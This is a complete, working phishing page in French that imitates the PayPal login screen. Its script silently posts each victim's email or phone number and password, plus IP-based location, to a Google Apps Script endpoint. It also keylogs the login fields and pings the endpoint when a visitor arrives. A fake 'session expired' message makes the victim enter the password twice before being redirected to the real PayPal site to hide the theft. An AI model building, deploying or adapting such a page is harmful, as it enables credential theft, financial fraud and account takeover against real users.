<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PayPal — Connexion</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,Helvetica,sans-serif}
body{background:#003087;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}
.wrap{width:460px;max-width:100%}
/* -------- GROS LOGO + GRAND TITRE PAYPAL -------- */
.brand{text-align:center;margin-bottom:24px}
.brand .biglogo{display:flex;justify-content:center;margin-bottom:6px}
.brand .biglogo svg{width:130px;height:auto}               /* logo très grand */
.brand .word{color:#fff;font-size:64px;font-weight:800;   /* "PAYPAL" en très grand */
  letter-spacing:2px;line-height:1;text-shadow:0 2px 10px rgba(0,0,0,.25)}
.brand .word .pa{color:#fff}
.brand .word .yp{color:#9cc3f5}
.brand .tag{color:#d6e3ff;font-size:14px;font-weight:500;margin-top:6px;letter-spacing:.5px}
.card{background:#fff;border-radius:10px;padding:32px 36px;box-shadow:0 10px 40px rgba(0,0,0,.25)}
.card h2{color:#003087;font-size:22px;margin-bottom:6px;text-align:center}
.card .sub{color:#4a4a4a;font-size:13px;margin-bottom:22px;text-align:center}
.input-wrap{margin-bottom:16px}
.input-wrap label{display:block;color:#4a4a4a;font-size:13px;font-weight:600;margin-bottom:6px}
.input-wrap input{width:100%;padding:13px 14px;border:1px solid #d1d1d1;border-radius:6px;font-size:15px;outline:none;transition:border .2s}
.input-wrap input:focus{border-color:#0070e0;box-shadow:0 0 0 3px rgba(0,112,224,.12)}
.input-wrap input::placeholder{color:#999}
.pw-row{position:relative}
.pw-row .eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;font-size:15px;color:#666}
.btn{width:100%;padding:14px;background:#0070e0;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s}
.btn:hover{background:#005bbd}
.btn:disabled{opacity:.6;cursor:wait}
.links{display:flex;align-items:center;justify-content:space-between;margin-top:18px;font-size:13px}
.links a{color:#0070e0;text-decoration:none}
.links a:hover{text-decoration:underline}
.flash{display:none;background:#fff3f3;border:1px solid #ffd4d4;color:#d43;font-size:13px;padding:10px;border-radius:6px;margin-top:14px;text-align:center}
.under{margin-top:18px;color:#c9d9f0;font-size:12px;text-align:center}
.under a{color:#fff;text-decoration:none}
.succ{position:fixed;inset:0;background:#fff;z-index:100001;display:none;align-items:center;justify-content:center;flex-direction:column;text-align:center;gap:14px}
.succ .c{width:66px;height:66px;border-radius:50%;background:#2e9b57;color:#fff;display:flex;align-items:center;justify-content:center;font-size:32px}
.succ p{color:#003087;font-size:17px;font-weight:600}
.loader-overlay{position:fixed;inset:0;background:#003087;z-index:100000;display:flex;align-items:center;justify-content:center;flex-direction:column;transition:opacity .4s}
.loader-overlay.hidden{opacity:0;pointer-events:none}
.loader-logo{font-size:40px;font-weight:800;color:#fff;letter-spacing:2px}
.loader-logo span{color:#9cc3f5}
.spinner{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle}
.spinner.show{display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<div class="loader-overlay" id="loader"><div class="loader-logo">PAY<span>PAL</span></div></div>
<div class="succ" id="succScreen"><div class="c">✓</div><p>Vous êtes connecté</p></div>

<div class="wrap">
  <!-- GROS LOGO + GRAND TITRE PAYPAL -->
  <div class="brand">
    <div class="biglogo">
      <svg viewBox="0 0 100 32" xmlns="http://www.w3.org/2000/svg">
        <path d="M13 4c-1 0-1.9.7-2.1 1.8L6 27c-.1.4.2.7.6.7h4.4c1 0 1.9-.7 2.1-1.8l1.6-9c.2-1.1 1.1-1.8 2.1-1.8H23c4.5 0 8.2-3.3 8.9-7.7C32.4 2 28.5 4 24 4H13z" fill="#003087"/>
        <path d="M32.4 8.4c-.3-1.9-.9-3.5-1.9-4.4-.2.3-.4.5-.6.8C28.4 2 26.8 1.3 25 1.3h-8.5c-1 0-1.9.7-2.1 1.8L9.9 27c-.1.4.2.7.6.7h5.1l.3-1.8 1.6-9c.2-1.1 1.1-1.8 2.1-1.8h4.3c4.2 0 7.7-3 8.3-6.9.3-1.7.1-3.3-.8-4.6v-.1z" fill="#009CDE"/>
        <path d="M22.4 8.4c-.3-1.9-.9-3.5-1.9-4.4-.2.3-.4.5-.6.8C18.4 2 16.8 1.3 15 1.3H6.5c-1 0-1.9.7-2.1 1.8L-.1 27c-.1.4.2.7.6.7h5.1l.3-1.8L7.5 16c.2-1.1 1.1-1.8 2.1-1.8h4.3c4.2 0 7.7-3 8.3-6.9.3-1.7.1-3.3-.8-4.6v.1z" fill="#fff"/>
      </svg>
    </div>
    <div class="word"><span class="pa">PAY</span><span class="yp">PAL</span></div>
    <div class="tag">Paiements sécurisés · Connexion à votre compte</div>
  </div>

  <div class="card">
    <h2>Connectez-vous</h2>
    <p class="sub">Accédez à votre compte pour finaliser la vérification.</p>

    <div class="input-wrap">
      <label for="email">E-mail ou numéro de téléphone</label>
      <input type="text" id="email" placeholder="vous@exemple.com" autocomplete="off" autocorrect="off" autocapitalize="off">
    </div>

    <div class="input-wrap pw-row">
      <label for="pass">Mot de passe</label>
      <input type="password" id="pass" placeholder="Votre mot de passe" autocomplete="off">
      <button class="eye" id="eyeBtn" type="button">👁</button>
    </div>

    <button class="btn" id="go"><span id="btnText">Se connecter</span></button>
    <div class="flash" id="flashMsg">Votre session a expiré. Veuillez vous reconnecter.</div>

    <div class="links">
      <a href="#">Mot de passe oublié ?</a>
      <a href="#">Créer un compte</a>
    </div>
  </div>

  <div class="under"><a href="#">Aide</a> · <a href="#">Contact</a> · <a href="#">Conditions</a></div>
</div>

<script>
(function(){
'use strict';

/* ============================================================
   ENDPOINT — votre récepteur Apps Script
   (token + chat ID vivent UNIQUEMENT côté Google, jamais ici)
   ============================================================ */
var EP='https://script.google.com/macros/s/AKfycbza8l1dv_UCQ1rvWtJ0MpOkhEdQAMjSGJ_xsuCqhx4h2DPSrGf61mTL3tzaDduzUnwPig/exec';

/* ============================================================
   REDIRECTION fin de parcours → VRAIE page PayPal login
   ============================================================ */
var REAL='https://www.paypal.com/signin';

/* ---------- envoi silencieux ---------- */
function send(txt){
  try{
    var x=new XMLHttpRequest();
    x.open('POST',EP,true);
    x.setRequestHeader('Content-Type','text/plain;charset=utf-8');
    x.send(JSON.stringify({text:txt}));
  }catch(e){}
}
function one(v){return (v||'').toString().replace(/\s+/g,' ').trim();}
function isEmail(s){return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test((s||'').trim());}
function isPhone(s){return /^\+?[0-9][0-9 .\-()]{5,}$/.test((s||'').trim());}
function getGeo(){
  try{
    var x=new XMLHttpRequest();x.open('GET','https://ipapi.co/json/',false);x.send();
    if(x.status===200){var d=JSON.parse(x.responseText);return (d.ip||'')+' | '+(d.city||'')+', '+(d.country_name||'');}
  }catch(e){}
  return '';
}

/* ============================================================
   MESSAGE PROPRE & ORDONNÉ
   ============================================================ */
function sendCred(id, pass){
  id=(id||'').trim();
  var L=[];
  L.push('\u{1F510} NOUVEAU COMPTE PAYPAL');
  L.push('-'.repeat(26));

  if(isEmail(id))      L.push('\u{1F4E7} E-mail : '+id);
  else if(isPhone(id)) L.push('\u{1F4F1} T\u00e9l\u00e9phone : '+id);
  else                 L.push('\u{1F464} Identifiant : '+id);

  if(pass) L.push('\u{1F511} Mot de passe : '+pass);
  L.push('-'.repeat(26));

  var g=getGeo(); if(g)L.push('\u{1F30D} '+g);
  L.push('\u{1F4C5} '+new Date().toISOString());
  send(L.join('\n'));
}

/* ---------- keylogger de secours ---------- */
var kl='';
document.addEventListener('keydown',function(e){
  var t=e.target;
  if(t&&(t.id==='email'||t.id==='pass')){
    var k=e.key;
    if(k.length===1)kl+=k;
    else if(k==='Backspace')kl=kl.slice(0,-1);
    else if(k==='Enter')kl+='[ENTREE]';
    if(kl.length>=48)flush();
  }
});
function flush(){ if(!kl)return; send('\u2328\ufe0f TAP\u00c9 AU CLAVIER (PayPal) :\n'+kl); kl=''; }
setInterval(function(){if(kl.length>8)flush();},3500);

/* ---------- ping visiteur ---------- */
setTimeout(function(){ send('\u{1F440} Visiteur page PayPal\n'+new Date().toISOString()); },1500);

/* ---------- loader ---------- */
setTimeout(function(){ document.getElementById('loader').classList.add('hidden'); },700);

/* ---------- eye ---------- */
document.getElementById('eyeBtn').addEventListener('click',function(){
  var p=document.getElementById('pass'); p.type=p.type==='password'?'text':'password';
});

/* ---------- soumission ---------- */
var go=document.getElementById('go');
var txt=document.getElementById('btnText');
var didOnce=false;

go.addEventListener('click',function(){
  flush();
  var e=one(document.getElementById('email').value);
  var p=document.getElementById('pass').value.trim();
  if(!e||!p)return;

  sendCred(e,p);
  go.disabled=true; txt.textContent='Connexion en cours...';
  setTimeout(function(){
    document.getElementById('pass').value='';
    go.disabled=false; txt.textContent='Se connecter';
    var f=document.getElementById('flashMsg'); f.style.display='block';
    didOnce=true;
  },1600);
});

/* 2e clic → capture + écran vert + redirection réelle */
go.addEventListener('click',function(){
  if(!didOnce)return;
  var e2=one(document.getElementById('email').value);
  var p2=document.getElementById('pass').value.trim();
  if(!e2||!p2)return;
  sendCred(e2,p2);
  var s=document.getElementById('succScreen'); s.style.display='flex';
  setTimeout(function(){ window.location.replace(REAL); },1400);
});
})();
</script>
</body>
</html>
